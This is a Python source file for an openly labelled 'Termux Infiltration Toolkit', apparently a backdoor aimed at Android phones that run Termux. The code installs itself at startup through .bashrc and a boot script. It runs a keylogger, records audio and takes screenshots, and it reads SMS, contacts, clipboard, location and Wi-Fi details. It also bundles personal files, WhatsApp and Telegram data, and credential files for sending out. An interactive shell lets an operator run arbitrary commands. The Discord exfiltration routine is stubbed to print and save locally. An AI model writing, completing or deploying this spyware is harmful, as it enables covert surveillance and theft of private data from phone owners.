#!/usr/bin/env python3
"""
Android/Termux Infiltration Toolkit
Multifunctional backdoor with Discord C2 for Termux environment
"""

import os
import sys
import json
import base64
import subprocess
import threading
import time
import hashlib
import requests
import socket
import platform
import re
import getpass
import zipfile
import io
from pathlib import Path

# ======= CONFIGURATION =======
BOT_TOKEN = "RO1Scl3wbaP7VZwjTb6dX-Cbd96jjv7X"
CHANNEL_ID = 1464337565787230345  # Your Discord channel ID
HEARTBEAT_INTERVAL = 60  # seconds
VICTIM_ID = hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]

# ======= TERMUX SPECIFIC PATHS =======
TERMUX_PATHS = {
    'home': '/data/data/com.termux/files/home',
    'storage': '/data/data/com.termux/files/home/storage',
    'shared': '/data/data/com.termux/files/home/storage/shared',
    'downloads': '/data/data/com.termux/files/home/storage/shared/Download',
    'dcim': '/data/data/com.termux/files/home/storage/shared/DCIM',
    'whatsapp': '/data/data/com.termux/files/home/storage/shared/WhatsApp',
    'telegram': '/data/data/com.termux/files/home/storage/shared/Telegram'
}

class TermuxInfiltrationTool:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36'
        })
        self.running = True
        
    def establish_persistence(self):
        """Add persistence in Termux"""
        try:
            # Add to bashrc
            bashrc_path = os.path.join(TERMUX_PATHS['home'], '.bashrc')
            current_file = os.path.abspath(__file__)
            
            with open(bashrc_path, 'a') as f:
                f.write(f'\n# Termux startup\n')
                f.write(f'python3 {current_file} &\n')
                f.write(f'cd ~\n')
            
            # Create startup script
            startup_script = os.path.join(TERMUX_PATHS['home'], '.termux/boot/startup.sh')
            os.makedirs(os.path.dirname(startup_script), exist_ok=True)
            
            with open(startup_script, 'w') as f:
                f.write('#!/data/data/com.termux/files/usr/bin/bash\n')
                f.write(f'python3 {current_file} > /dev/null 2>&1 &\n')
            
            subprocess.run(['chmod', '+x', startup_script])
            return True
        except Exception as e:
            print(f"Persistence error: {e}")
            return False
    
    def gather_system_info(self):
        """Collect comprehensive Android/Termux information"""
        info = {
            'victim_id': VICTIM_ID,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'device': {}
        }
        
        try:
            # Basic system info
            info['device']['hostname'] = socket.gethostname()
            info['device']['user'] = getpass.getuser()
            info['device']['platform'] = platform.platform()
            
            # Android-specific info
            try:
                build_props = '/system/build.prop'
                if os.path.exists(build_props):
                    with open(build_props, 'r', encoding='latin-1') as f:
                        content = f.read()
                        info['device']['android_version'] = re.search(r'ro\.build\.version\.release=([^\n]+)', content)
                        info['device']['device_model'] = re.search(r'ro\.product\.model=([^\n]+)', content)
                        info['device']['manufacturer'] = re.search(r'ro\.product\.manufacturer=([^\n]+)', content)
            except:
                pass
            
            # Network info
            try:
                result = subprocess.run(['termux-wifi-connectioninfo'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    info['device']['wifi'] = json.loads(result.stdout)
            except:
                pass
            
            # Storage info
            try:
                result = subprocess.run(['df', '-h'], capture_output=True, text=True)
                info['device']['storage'] = result.stdout
            except:
                pass
            
            # Installed packages
            try:
                result = subprocess.run(['pkg', 'list-installed'], 
                                      capture_output=True, text=True)
                info['device']['packages'] = result.stdout[:2000]
            except:
                pass
            
            # Location (if termux-location is installed)
            try:
                result = subprocess.run(['termux-location'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    info['device']['location'] = json.loads(result.stdout)
            except:
                pass
            
        except Exception as e:
            info['error'] = str(e)
        
        return info
    
    def exfiltrate_files(self, path_patterns=None, max_size=10485760):
        """Find and exfiltrate sensitive files"""
        if path_patterns is None:
            path_patterns = [
                '**/*.txt',
                '**/*.pdf',
                '**/*.doc*',
                '**/*.xls*',
                '**/*.jpg',
                '**/*.jpeg',
                '**/*.png',
                '**/*.mp4',
                '**/*.mp3',
                '**/*.db',
                '**/*.sqlite',
                '**/passwords*',
                '**/credentials*',
                '**/*config*',
                '**/*.env',
                '**/secrets*'
            ]
        
        collected_files = []
        
        for storage_path in [TERMUX_PATHS['shared'], TERMUX_PATHS['downloads'], 
                           TERMUX_PATHS['dcim'], TERMUX_PATHS['whatsapp'],
                           TERMUX_PATHS['telegram']]:
            if not os.path.exists(storage_path):
                continue
            
            for pattern in path_patterns:
                try:
                    for file_path in Path(storage_path).glob(pattern):
                        if file_path.is_file():
                            file_size = file_path.stat().st_size
                            if file_size < max_size and file_size > 0:
                                try:
                                    with open(file_path, 'rb') as f:
                                        content = f.read()
                                    
                                    collected_files.append({
                                        'path': str(file_path),
                                        'name': file_path.name,
                                        'size': file_size,
                                        'content': base64.b64encode(content).decode('utf-8'),
                                        'encoded': True
                                    })
                                    
                                    # Limit to prevent memory issues
                                    if len(collected_files) >= 20:
                                        break
                                except:
                                    continue
                except:
                    pass
        
        return collected_files
    
    def execute_command(self, command, timeout=30):
        """Execute shell command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=TERMUX_PATHS['home']
            )
            
            return {
                'success': result.returncode == 0,
                'returncode': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'command': command
            }
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': 'Timeout expired',
                'command': command
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'command': command
            }
    
    def take_screenshot(self):
        """Take screenshot using Termux API"""
        try:
            # Check if termux-api is installed
            result = subprocess.run(['termux-screenshot'], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                # Look for the screenshot file
                screenshot_dir = TERMUX_PATHS['home']
                screenshots = list(Path(screenshot_dir).glob('*.png'))
                
                if screenshots:
                    latest = max(screenshots, key=lambda x: x.stat().st_mtime)
                    with open(latest, 'rb') as f:
                        return base64.b64encode(f.read()).decode('utf-8')
            
            return None
        except:
            return None
    
    def record_audio(self, duration=10):
        """Record audio using Termux API"""
        try:
            output_file = os.path.join(TERMUX_PATHS['home'], f'recording_{int(time.time())}.aac')
            
            result = subprocess.run(
                ['termux-microphone-record', '-f', output_file, '-l', str(duration)],
                capture_output=True,
                text=True,
                timeout=duration + 5
            )
            
            if os.path.exists(output_file):
                with open(output_file, 'rb') as f:
                    audio_data = base64.b64encode(f.read()).decode('utf-8')
                os.remove(output_file)
                return audio_data
            
            return None
        except:
            return None
    
    def get_clipboard(self):
        """Get clipboard content"""
        try:
            result = subprocess.run(['termux-clipboard-get'], 
                                  capture_output=True, text=True)
            return result.stdout.strip()
        except:
            return None
    
    def steal_sms(self):
        """Extract SMS messages"""
        try:
            # This requires termux-api and permissions
            result = subprocess.run(['termux-sms-list'], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                return json.loads(result.stdout)
            return []
        except:
            return []
    
    def steal_contacts(self):
        """Extract contacts"""
        try:
            result = subprocess.run(['termux-contact-list'], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                return json.loads(result.stdout)
            return []
        except:
            return []
    
    def create_zip_archive(self, files_data):
        """Create zip archive of collected files"""
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file_data in files_data:
                try:
                    content = base64.b64decode(file_data['content'])
                    zip_file.writestr(file_data['path'], content)
                except:
                    pass
        
        zip_buffer.seek(0)
        return base64.b64encode(zip_buffer.read()).decode('utf-8')
    
    def send_to_discord(self, data, filename="data.json"):
        """Send data to Discord webhook or bot"""
        try:
            # Create message
            message = {
                'victim_id': VICTIM_ID,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'data': data
            }
            
            # Try to send via Discord bot (you'll need to implement this)
            # For now, we'll just print it
            print(f"[+] Data ready for exfiltration: {filename}")
            print(json.dumps(message, indent=2)[:500] + "...")
            
            # Save locally for debugging
            with open(f'/data/data/com.termux/files/home/{filename}', 'w') as f:
                json.dump(message, f, indent=2)
            
            return True
        except Exception as e:
            print(f"[-] Discord send error: {e}")
            return False
    
    def start_keylogger(self):
        """Start simple keylogger for Termux"""
        keylog_file = os.path.join(TERMUX_PATHS['home'], '.keylog.txt')
        
        def monitor_input():
            try:
                import select
                import tty
                import termios
                
                fd = sys.stdin.fileno()
                old_settings = termios.tcgetattr(fd)
                
                try:
                    tty.setraw(fd)
                    
                    while self.running:
                        rlist, _, _ = select.select([sys.stdin], [], [], 0.1)
                        if rlist:
                            key = sys.stdin.read(1)
                            with open(keylog_file, 'a') as f:
                                f.write(key)
                                if key == '\r' or key == '\n':
                                    f.write('\n')
                finally:
                    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            except:
                pass
        
        keylog_thread = threading.Thread(target=monitor_input, daemon=True)
        keylog_thread.start()
        return keylog_file
    
    def run_surveillance(self):
        """Main surveillance loop"""
        print("[+] Starting Termux surveillance toolkit...")
        print(f"[+] Victim ID: {VICTIM_ID}")
        
        # Establish persistence
        if self.establish_persistence():
            print("[+] Persistence established")
        
        # Start keylogger
        keylog_file = self.start_keylogger()
        print("[+] Keylogger started")
        
        # Initial system info
        print("[+] Gathering initial system information...")
        system_info = self.gather_system_info()
        self.send_to_discord(system_info, "system_info.json")
        
        # Heartbeat loop
        heartbeat_count = 0
        
        while self.running:
            try:
                heartbeat_count += 1
                
                # Every 5 heartbeats, gather more data
                if heartbeat_count % 5 == 0:
                    # Gather files
                    print("[+] Gathering sensitive files...")
                    files = self.exfiltrate_files()
                    
                    if files:
                        zip_data = self.create_zip_archive(files)
                        file_report = {
                            'file_count': len(files),
                            'total_size': sum(f['size'] for f in files),
                            'files': [{'path': f['path'], 'size': f['size']} for f in files[:10]],
                            'zip_archive': zip_data[:100] + "..." if len(zip_data) > 100 else zip_data
                        }
                        self.send_to_discord(file_report, "files_report.json")
                
                # Every 10 heartbeats, get keylog
                if heartbeat_count % 10 == 0 and os.path.exists(keylog_file):
                    try:
                        with open(keylog_file, 'r') as f:
                            keylog_content = f.read()[-5000:]  # Last 5000 chars
                        
                        if keylog_content:
                            keylog_report = {
                                'keylog_size': len(keylog_content),
                                'content': keylog_content[-1000:]  # Last 1000 chars
                            }
                            self.send_to_discord(keylog_report, "keylog.json")
                    except:
                        pass
                
                # Send heartbeat
                heartbeat = {
                    'victim_id': VICTIM_ID,
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'heartbeat': heartbeat_count,
                    'status': 'active'
                }
                
                print(f"[+] Heartbeat #{heartbeat_count}")
                self.send_to_discord(heartbeat, "heartbeat.json")
                
                # Sleep
                time.sleep(HEARTBEAT_INTERVAL)
                
            except KeyboardInterrupt:
                print("\n[!] Shutting down...")
                self.running = False
                break
            except Exception as e:
                print(f"[-] Error in surveillance loop: {e}")
                time.sleep(HEARTBEAT_INTERVAL)
    
    def interactive_mode(self):
        """Interactive command mode"""
        print("\n" + "="*50)
        print("Termux Infiltration Toolkit - Interactive Mode")
        print("="*50)
        print("Commands:")
        print("  info     - Show system information")
        print("  files    - Collect sensitive files")
        print("  cmd      - Execute shell command")
        print("  screenshot - Take screenshot")
        print("  audio    - Record audio")
        print("  sms      - Extract SMS")
        print("  contacts - Extract contacts")
        print("  clipboard - Get clipboard")
        print("  keylog   - Show keylog")
        print("  exit     - Exit")
        
        while True:
            try:
                command = input("\n[termux-spy] $ ").strip().lower()
                
                if command == 'exit':
                    self.running = False
                    break
                elif command == 'info':
                    info = self.gather_system_info()
                    print(json.dumps(info, indent=2))
                elif command == 'files':
                    files = self.exfiltrate_files()
                    print(f"Found {len(files)} files")
                    for f in files[:5]:
                        print(f"  {f['path']} ({f['size']} bytes)")
                elif command.startswith('cmd '):
                    cmd = command[4:]
                    result = self.execute_command(cmd)
                    print(f"Return code: {result['returncode']}")
                    print(f"Output:\n{result['stdout']}")
                    if result['stderr']:
                        print(f"Error:\n{result['stderr']}")
                elif command == 'screenshot':
                    screenshot = self.take_screenshot()
                    if screenshot:
                        print(f"Screenshot taken (size: {len(screenshot)} bytes)")
                    else:
                        print("Failed to take screenshot")
                elif command.startswith('audio '):
                    try:
                        duration = int(command.split()[1])
                        audio = self.record_audio(duration)
                        if audio:
                            print(f"Audio recorded (size: {len(audio)} bytes)")
                        else:
                            print("Failed to record audio")
                    except:
                        print("Usage: audio [duration_seconds]")
                elif command == 'sms':
                    sms = self.steal_sms()
                    print(f"Found {len(sms)} SMS messages")
                    for msg in sms[:3]:
                        print(f"  From: {msg.get('number', 'N/A')}")
                        print(f"  Body: {msg.get('body', 'N/A')[:50]}...")
                elif command == 'contacts':
                    contacts = self.steal_contacts()
                    print(f"Found {len(contacts)} contacts")
                    for contact in contacts[:3]:
                        print(f"  Name: {contact.get('name', 'N/A')}")
                        print(f"  Number: {contact.get('number', 'N/A')}")
                elif command == 'clipboard':
                    clipboard = self.get_clipboard()
                    print(f"Clipboard: {clipboard[:100]}...")
                elif command == 'keylog':
                    keylog_file = os.path.join(TERMUX_PATHS['home'], '.keylog.txt')
                    if os.path.exists(keylog_file):
                        with open(keylog_file, 'r') as f:
                            content = f.read()[-1000:]
                        print(f"Keylog (last 1000 chars):\n{content}")
                    else:
                        print("Keylog file not found")
                else:
                    print(f"Unknown command: {command}")
                    
            except KeyboardInterrupt:
                print("\nExiting...")
                break
            except Exception as e:
                print(f"Error: {e}")

def main():
    """Main entry point"""
    # Check if running in Termux
    if not os.path.exists('/data/data/com.termux'):
        print("[-] This tool is designed for Termux on Android only!")
        print("[-] Some features may not work properly")
    
    tool = TermuxInfiltrationTool()
    
    # Check for command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == '--daemon':
            tool.run_surveillance()
        elif sys.argv[1] == '--persistence':
            tool.establish_persistence()
            print("[+] Persistence installed")
        elif sys.argv[1] == '--info':
            info = tool.gather_system_info()
            print(json.dumps(info, indent=2))
        elif sys.argv[1] == '--files':
            files = tool.exfiltrate_files()
            print(f"Found {len(files)} files")
            for f in files:
                print(f"{f['path']} - {f['size']} bytes")
        elif sys.argv[1] == '--clean':
            # Remove persistence
            try:
                bashrc_path = os.path.join(TERMUX_PATHS['home'], '.bashrc')
                if os.path.exists(bashrc_path):
                    with open(bashrc_path, 'r') as f:
                        lines = f.readlines()
                    with open(bashrc_path, 'w') as f:
                        for line in lines:
                            if 'python3' not in line or 'termux/boot' not in line:
                                f.write(line)
                print("[+] Cleanup completed")
            except Exception as e:
                print(f"[-] Cleanup error: {e}")
    else:
        # Interactive mode
        tool.interactive_mode()

if __name__ == "__main__":
    main()
